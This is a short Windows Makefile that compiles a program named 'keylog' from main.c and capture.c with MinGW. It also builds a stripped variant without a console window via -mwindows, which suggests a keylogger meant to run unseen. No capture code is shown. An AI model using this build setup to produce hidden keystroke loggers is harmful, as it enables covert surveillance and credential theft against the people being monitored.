CC     = mingw32-gcc
CC32   = i686-w64-mingw32-gcc
CC64   = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Werror -Wextra -static -Os -s
EXE    = keylog

OBJ = main.c capture.c

all: $(OBJ)
	$(CC) $(CFLAGS) $(OBJ) -o $(EXE)
	$(CC) $(CFLAGS) $(OBJ) -o $(EXE)h -mwindows

clean:
	del "*.o" "*.exe"